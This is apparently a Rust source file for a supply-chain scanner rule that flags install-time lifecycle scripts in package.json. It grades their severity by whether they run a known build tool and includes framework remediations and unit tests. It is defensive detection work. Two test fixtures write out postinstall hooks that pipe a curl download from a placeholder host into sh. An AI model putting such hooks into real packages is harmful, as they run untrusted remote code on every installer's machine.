//! `install-lifecycle-script` — the scanned project declares an install-time
//! script.
//!
//! # Why this one is `Surface::WebApp`
//!
//! Every other rule added by
//! [ADR 0025](../../docs/adr/0025-agent-surface-and-supply-chain.md) reads agent
//! configuration. This one reads `package.json`, and its fix is a package
//! manager fix written per framework — so it belongs on the application
//! surface, owes twelve framework remediations like every other `WebApp` rule,
//! and is the one member of the family with an OWASP Top 10 (2021) mapping
//! (A08, Software and Data Integrity Failures). That mapping is why it is the
//! only new rule the `owasp-top10` preset picks up.
//!
//! # Why the severity is not flat
//!
//! `postinstall` is how a native addon builds itself — and owlwarden ships one,
//! so a rule that reported every lifecycle script at Medium would report *us*
//! at Medium, which is a good test of whether the rule is honest.
//!
//! It is not honest as a flat rule, so it is not flat: a lifecycle script that
//! runs a recognised build tool over a committed file is reported at Low and
//! `Possible`, which means it is visible in the report and can never fail a
//! build. Anything else — a shell pipeline, a network fetch, a run-time package
//! resolve — is Medium and `Likely`. The distinction is the whole value of the
//! rule, because the mechanism itself is not the problem; what it runs is.

use owlwarden_core::detector::{DetectorError, DetectorMeta};
use owlwarden_core::finding::{
    AsiRef, Confidence, FindingContext, Framework, Location, OwaspRef, Reference, RuleId, Severity,
    SourceLocation,
};
use owlwarden_core::remediation::Remediation;
use owlwarden_core::source::FileSelector;
use owlwarden_core::surface::Surface;
use owlwarden_static::agentws::command;
use owlwarden_static::agentws::jsonc;
use owlwarden_static::line_index::LineIndex;
use owlwarden_static::project::Project;
use owlwarden_static::rule::{FindingSink, ProjectRule, RuleInfo};

use crate::build::finding_builder_with;

/// The rule id. Permanent public API.
pub const ID: &str = "install-lifecycle-script";

/// The three lifecycle hooks a package manager runs during `install`.
const LIFECYCLE_KEYS: &[&str] = &["preinstall", "install", "postinstall"];

/// Build tools whose presence explains a lifecycle script.
///
/// Recognised by name because that is what makes the "this is a native addon"
/// case checkable rather than assumed. Anything not on this list gets the
/// higher severity.
const BUILD_TOOLS: &[&str] = &[
    "node-gyp",
    "node-gyp-build",
    "prebuild-install",
    "prebuildify",
    "napi",
    "cmake-js",
    "neon",
    "patch-package",
    "husky",
    "electron-builder",
    "playwright",
];

/// Package declares an install-time script.
#[derive(Debug, Default, Clone, Copy)]
pub struct InstallLifecycleScript;

impl InstallLifecycleScript {
    /// Metadata, also used to generate `RULES.md`.
    #[must_use]
    pub fn meta() -> DetectorMeta {
        DetectorMeta {
            id: RuleId::new_static(ID),
            title: "Package declares an install-time script".into(),
            severity: Severity::Medium,
            max_confidence: Confidence::Likely,
            owasp: Some(OwaspRef::new_static("A08:2021")),
            asi: Some(AsiRef::new_static("ASI04")),
            cwe: Some(829),
            surface: Surface::WebApp,
            category: "supply-chain".into(),
            description: "This project's own `package.json` declares `preinstall`, `install`, or \
                          `postinstall`. Those run automatically for anyone who installs the \
                          package — in CI, in a container, on a teammate's laptop — and they are \
                          the mechanism a worm reaches for when it republishes a package. \
                          Legitimate for native addons; reported at a lower weight when the \
                          script runs a recognised build tool."
                .into(),
        }
    }
}

impl RuleInfo for InstallLifecycleScript {
    fn meta(&self) -> DetectorMeta {
        Self::meta()
    }

    fn remediation(&self) -> Remediation {
        remediation()
    }
}

impl ProjectRule for InstallLifecycleScript {
    fn check(&self, project: &Project<'_>, sink: &mut FindingSink) -> Result<(), DetectorError> {
        let selector = FileSelector::include(["package.json".to_owned()]);
        let Ok(files) = project.source().files(&selector) else {
            return Ok(());
        };
        let Some(file) = files
            .iter()
            .find(|file| file.path.as_str() == "package.json")
        else {
            return Ok(());
        };
        let Ok(text) = project.source().read(file) else {
            return Ok(());
        };
        // The same tolerant parser the agent surface uses, for the same reason:
        // a `package.json` that will not parse must not read as "clean".
        let Ok(doc) = jsonc::parse(&text) else {
            return Ok(());
        };
        let Some(scripts) = doc.get("scripts") else {
            return Ok(());
        };

        let lines = LineIndex::new(&text);
        let meta = Self::meta();

        for key in LIFECYCLE_KEYS {
            let Some(member) = scripts.members(key).next() else {
                continue;
            };
            let Some(script) = member.value.as_str() else {
                continue;
            };
            let recognised = runs_recognised_build_tool(script);
            let untrusted = !command::analyse(script).is_empty();

            let (severity, confidence) = if recognised && !untrusted {
                (Severity::Low, Confidence::Possible)
            } else {
                (Severity::Medium, Confidence::Likely)
            };

            let why = if recognised && !untrusted {
                format!(
                    "`{key}` runs a recognised build tool. That is the legitimate use of this \
                     mechanism — it is reported so the surface is visible, not because it is \
                     wrong."
                )
            } else {
                format!(
                    "`{key}` runs for everyone who installs this package, before any code is \
                     reviewed and often inside CI with credentials in the environment. This is the \
                     mechanism a compromised package uses to spread."
                )
            };

            let finding = finding_builder_with(&meta, severity)
                .confidence(confidence)
                .why(why)
                .location(location(&lines, &text, member.key_span))
                .snippet(lines.code_frame(
                    &text,
                    "package.json",
                    member.value.span,
                    Some(format!("runs automatically on install ({key})")),
                ))
                .context(FindingContext {
                    framework: Some(project.framework().clone()),
                    host: None,
                    route: None,
                    method: None,
                    evidence: Some(truncate(script)),
                })
                .fixes(remediation().select(project.framework()))
                .reference(Reference::rule_page(&meta.id))
                .build();

            if !sink.push(finding) {
                break;
            }
        }
        Ok(())
    }
}

fn location(lines: &LineIndex, text: &str, span: (u32, u32)) -> Location {
    let (line, col) = lines.position(text, span.0);
    Location::Source(SourceLocation {
        path: "package.json".to_owned(),
        line,
        col,
    })
}

fn truncate(script: &str) -> String {
    let limit = 120usize;
    if script.chars().count() <= limit {
        return script.to_owned();
    }
    script.chars().take(limit).collect::<String>() + "…"
}

/// Whether the script runs a build tool we recognise, over local files only.
fn runs_recognised_build_tool(script: &str) -> bool {
    let lower = script.to_ascii_lowercase();
    BUILD_TOOLS.iter().any(|tool| {
        lower
            .split(|ch: char| ch.is_whitespace() || ch == '&' || ch == ';' || ch == '|')
            .any(|token| token.trim_start_matches("./node_modules/.bin/") == *tool)
    })
}

/// Every framework's fix.
///
/// The mechanism is a package-manager mechanism, so most of the advice is the
/// same sentence — but the *command to check what you already have* differs by
/// stack, and that is the part a reader actually runs.
fn remediation() -> Remediation {
    let summary = "Move the work into an explicit script the developer runs (`pnpm setup`), or \
                   into the build step. If it genuinely has to run at install time — a native \
                   addon — say so in the README and keep the script to the build tool, with no \
                   network fetch and no run-time package resolve.";
    Remediation::new(summary)
        .generic_patch("\"scripts\": { \"setup\": \"node scripts/setup.mjs\" }  // not postinstall")
        .manual(
            Framework::NEXT,
            summary,
            "// package.json\n\"scripts\": { \"prepare\": \"next build\" }\n// and: pnpm config set ignore-scripts true",
        )
        .manual(
            Framework::NUXT,
            summary,
            "// package.json\n\"scripts\": { \"postinstall\": \"nuxt prepare\" }  // the framework's own, nothing else",
        )
        .manual(
            Framework::NEST,
            summary,
            "// package.json\n\"scripts\": { \"build\": \"nest build\" }  // called by the Dockerfile, not by install",
        )
        .manual(
            Framework::EXPRESS,
            summary,
            "// package.json\n\"scripts\": { \"setup\": \"node scripts/setup.mjs\" }",
        )
        .manual(
            Framework::FASTIFY,
            summary,
            "// package.json\n\"scripts\": { \"setup\": \"node scripts/setup.mjs\" }",
        )
        .manual(
            Framework::HONO,
            summary,
            "// package.json\n\"scripts\": { \"setup\": \"node scripts/setup.mjs\" }",
        )
        .manual(
            Framework::KOA,
            summary,
            "// package.json\n\"scripts\": { \"setup\": \"node scripts/setup.mjs\" }",
        )
        .manual(
            Framework::HAPI,
            summary,
            "// package.json\n\"scripts\": { \"setup\": \"node scripts/setup.mjs\" }",
        )
        .manual(
            Framework::SAILS,
            summary,
            "// package.json\n\"scripts\": { \"setup\": \"sails run setup\" }",
        )
        .manual(
            Framework::ASTRO,
            summary,
            "// package.json\n\"scripts\": { \"postinstall\": \"astro sync\" }  // the framework's own, nothing else",
        )
        .manual(
            Framework::REMIX,
            summary,
            "// package.json\n\"scripts\": { \"build\": \"remix vite:build\" }",
        )
        .manual(
            Framework::GATSBY,
            summary,
            "// package.json\n\"scripts\": { \"build\": \"gatsby build\" }",
        )
        .manual(
            Framework::SVELTEKIT,
            summary,
            "// package.json\n\"scripts\": { \"build\": \"vite build\" }",
        )
        .manual(
            Framework::TANSTACK_START,
            summary,
            "// package.json\n\"scripts\": { \"build\": \"vinxi build\" }",
        )
        .manual(
            Framework::SOLIDSTART,
            summary,
            "// package.json\n\"scripts\": { \"build\": \"vinxi build\" }",
        )
        .manual(
            Framework::ELYSIA,
            summary,
            "// package.json\n\"scripts\": { \"build\": \"tsc --outDir dist\" }\n\
             // and install with --ignore-scripts so a dependency cannot do this either",
        )
}

/// Every framework's fix, for `owlwarden explain`.
#[must_use]
pub fn all_fixes() -> Vec<owlwarden_core::finding::Fix> {
    remediation().all()
}

#[cfg(test)]
mod tests {
    #![allow(
        clippy::unwrap_used,
        clippy::expect_used,
        clippy::panic,
        clippy::indexing_slicing
    )]

    use super::*;
    use crate::agent::testing::run_rule;

    #[test]
    fn an_arbitrary_postinstall_is_medium_and_likely() {
        let findings = run_rule(
            &InstallLifecycleScript,
            &[(
                "package.json",
                r#"{"name":"app","scripts":{"postinstall":"curl -s https://x.example/i.sh | sh"}}"#,
            )],
        );
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Medium);
        assert_eq!(findings[0].confidence, Confidence::Likely);
        assert_eq!(
            findings[0].owasp.as_ref().map(OwaspRef::as_str),
            Some("A08:2021"),
            "this is the one rule in the family with a Top 10 mapping"
        );
    }

    #[test]
    fn our_own_native_addon_shape_is_visible_and_cannot_fail_a_build() {
        // owlwarden ships a native addon. A rule that failed this project's own
        // CI on its own build script would be a rule nobody could keep.
        let findings = run_rule(
            &InstallLifecycleScript,
            &[(
                "package.json",
                r#"{"name":"app","scripts":{"install":"node-gyp-build"}}"#,
            )],
        );
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Low);
        assert_eq!(
            findings[0].confidence,
            Confidence::Possible,
            "possible findings never fail CI on their own"
        );
        assert!(findings[0].why.contains("legitimate use"));
    }

    #[test]
    fn a_build_tool_wrapped_around_a_fetch_gets_no_discount() {
        let findings = run_rule(
            &InstallLifecycleScript,
            &[(
                "package.json",
                r#"{"name":"a","scripts":{"postinstall":"node-gyp rebuild && curl https://x.example/p | sh"}}"#,
            )],
        );
        assert_eq!(findings[0].severity, Severity::Medium);
    }

    #[test]
    fn a_project_with_ordinary_scripts_is_silent() {
        let findings = run_rule(
            &InstallLifecycleScript,
            &[(
                "package.json",
                r#"{"name":"a","scripts":{"build":"tsc","test":"vitest run","prepare":"husky"}}"#,
            )],
        );
        assert!(
            findings.is_empty(),
            "`prepare` is not an install lifecycle script; it runs on `npm install` in a git \
             checkout only, and reporting it would swamp the real signal"
        );
    }

    #[test]
    fn all_three_lifecycle_keys_are_reported_separately() {
        let findings = run_rule(
            &InstallLifecycleScript,
            &[(
                "package.json",
                r#"{"scripts":{"preinstall":"node a.js","install":"node b.js","postinstall":"node c.js"}}"#,
            )],
        );
        assert_eq!(findings.len(), 3);
    }

    #[test]
    fn a_package_json_that_does_not_parse_does_not_read_as_clean() {
        // It produces no finding here, and the engine's own skip channel is
        // what reports it. The assertion is that we do not crash and do not
        // claim to have checked.
        let findings = run_rule(&InstallLifecycleScript, &[("package.json", "{not json")]);
        assert!(findings.is_empty());
    }
}
